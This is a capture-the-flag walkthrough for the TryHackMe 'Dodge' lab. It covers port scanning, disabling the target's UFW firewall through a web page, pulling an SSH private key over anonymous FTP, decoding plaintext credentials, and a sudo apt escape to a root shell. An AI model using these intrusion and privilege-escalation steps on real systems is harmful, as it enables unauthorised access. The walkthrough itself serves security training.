# [Dodge](https://tryhackme.com/room/dodge)

## Test your pivoting and network evasion skills.

Welcome to the network evasion challenge, part of TryHackMe’s Red Teaming Path.

### What is the content of user.txt?

1. Start by enumerating the target with a full port scan:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d9:ff:70:cd:6f:d0:ed:21:b1:e4:95:14:c6:99:eb:9d (RSA)
|   256 76:e7:71:1b:40:a4:56:eb:c8:96:fa:79:74:58:95:23 (ECDSA)
|_  256 c0:37:ac:13:a6:43:13:2c:33:2f:bb:8a:7f:7e:20:2e (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.41
| tls-alpn:
|_  http/1.1
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=dodge.thm/organizationName=Dodge Company, Inc./stateOrProvinceName=Tokyo/countryName=JP
| Subject Alternative Name: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
| Not valid before: 2023-06-29T11:46:51
|_Not valid after:  2123-06-05T11:46:51
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Hosts: default, ip-10-114-136-163.eu-central-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. The SSL certificate reveals virtual host names. Add them to `hosts` so the browser and HTTP client resolve the correct site:

```bash
echo "<TARGET_IP> dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm" >> /etc/hosts
```

3. Inspect `https://netops-dev.dodge.thm/firewall.js`. It contains a commented-out `fetch()` request, which is a hint that the firewall page uses AJAX and that `firewall10110.php` is the relevant endpoint.

**Results:**

```js
// Make an AJAX request using fetch
/*
fetch('firewall10110.php', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
})
  .then(function(response) {
    if (response.ok) {
      // Request successful, handle the response
      return response.json();
    } else {
      // Request failed
      throw new Error('Request failed. Status:', response.status);
    }
  })
  .then(function(data) {
    // Process the data as needed
  })
  .catch(function(error) {
    // Handle any errors that occurred during the request
    console.log('Error:', error);
  });
  
 */
```

4. Open `https://netops-dev.dodge.thm/firewall10110.php`. It displays the current UFW rules and shows that port 21 / FTP is denied.

```
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), deny (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
80                         ALLOW IN    Anywhere
443                        ALLOW IN    Anywhere
22                         ALLOW IN    Anywhere
21                         DENY IN     Anywhere
21/tcp                     DENY IN     Anywhere
80 (v6)                    ALLOW IN    Anywhere (v6)
443 (v6)                   ALLOW IN    Anywhere (v6)
22 (v6)                    ALLOW IN    Anywhere (v6)
21 (v6)                    DENY IN     Anywhere (v6)
21/tcp (v6)                DENY IN     Anywhere (v6)
```

5. The service is available but blocked by the firewall. Use the firewall interface to allow FTP on the target.

```bash
sudo ufw allow 21
sudo ufw allow ftp
sudo ufw disable
```

6. Connect to the target over FTP using anonymous login. Browse the FTP tree and download the SSH files:

```bash
ftp <TARGET_IP>
# anonymous
ls -la
cd .ssh
ls -la
prompt off
mget *
```

7. Inspect `authorized_keys` to confirm the SSH user and key owner:

```bash
cat authorized_keys
```

**Results:**

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZW5R4HgB14ktmtFtoi5L18tDtEZgBVAn25xuq5rKonu2U660QyL/+M33Fq9BykOhkz/tvGkHR2TZNcTsvzr0H5wFBBk05uGL5CmjCHsPj3r+Wxq/K9wecnpp9IHZXPKZfS7fq0f1mptf4YZlsIPSv4Hm3Sg8UYT/CeOMCu+TsiegdPUwbj9gaKcishf6u73ml7SUMFEuuHP3Xk1wgig+dA90Zk3MOcGcaP5slBwkDrY8A8Q6w9gYuWzAravqlYMNyCd4oHfvYWuz4dynqNKEUves1eKOfQo9aVc+tvfKchCwiK8hLKbvSp0jpCJZLOoS2v0DOFfZXNbMATNLcgtvT2r6nzKxjwJD0u5vq2ftrwsEuLr0hiLqCHu9UcKgVk0PMyTd8T0Vn/0nqUvPtCIm4AagwaLIGQLR2RnKB+NdG14EFgsIxK/Ntac+pZEgg5BQHalMtlGarcRqYjDsye1WPFHlPMGoLUcoH31phXUslNBjigdc8EPMOSX+7PhQVMD0= challenger@thm-lamp
```

8. Secure the downloaded private key and use it to SSH in:

```bash
chmod 600 id_rsa_backup
ssh -i id_rsa_backup challenger@<TARGET_IP>
```

9. Read the user flag:

```bash
cat user.txt
```

<img width="389" height="86" alt="SCREEN01" src="https://github.com/user-attachments/assets/c69efa1c-907f-4b7e-aa2a-adc3cf116c74" />

---

### What is the content of root.txt?

1. Enumerate the web application for interesting files. The file `/var/www/notes/api/posts.php` contains server-side logic and a Base64 string.

```bash
cat /var/www/notes/api/posts.php
```

**Results:**

```php
<?php
session_start();
require 'config.php';
header('Content-Type: application/json');
if (isset($_SESSION['username'])) {
    $posts = 'W3sidGl0bGUiOiJUby1kbyBsaXN0IiwiY29udGVudCI6IkRlZmluZSBhcHAgcmVxdWlyZW1lbnRzOjxicj4gMS4gRGVzaWduIHVzZXIgaW50ZXJmYWNlLiA8YnI+IDIuIFNldCB1cCBkZXZlbG9wbWVudCBlbnZpcm9ubWVudC4gPGJyPiAzLiBJbXBsZW1lbnQgYmFzaWMgZnVuY3Rpb25hbGl0eS4ifSx7InRpdGxlIjoiTXkgU1NIIGxvZ2luIiwiY29udGVudCI6ImNvYnJhIFwvIG16NCVvN0JHdW0jVFR1In1d';
    echo base64_decode($posts);

} else {
  echo json_encode(array('error' => 'Not logged in'));
}
?>
```

2. Decode the Base64 string to reveal credentials:

```json
[
  {
    "title": "To-do list",
    "content": "Define app requirements:<br> 1. Design user interface. <br> 2. Set up development environment. <br> 3. Implement basic functionality."
  },
  { "title": "My SSH login", "content": "cobra \/ mz4%o7BGum#TTu" }
]
```

3. Use the discovered credentials to switch user:

```bash
su cobra
# Password: mz4%o7BGum#TTu
```

4. Check sudo privileges:

```bash
sudo -l
```

**Results:**

```
User cobra may run the following commands on ip-10-114-136-163:
    (ALL) NOPASSWD: /usr/bin/apt
```

5. Use the `apt` sudo privilege to get a root shell via [GTFOBins](https://gtfobins.github.io/):

```bash
sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

6. Once you have a root shell, read the root flag:

```bash
cat /root/root.txt
```

<img width="836" height="134" alt="SCREEN02" src="https://github.com/user-attachments/assets/9f81580f-ef21-46a4-b234-d815abf5dad4" />
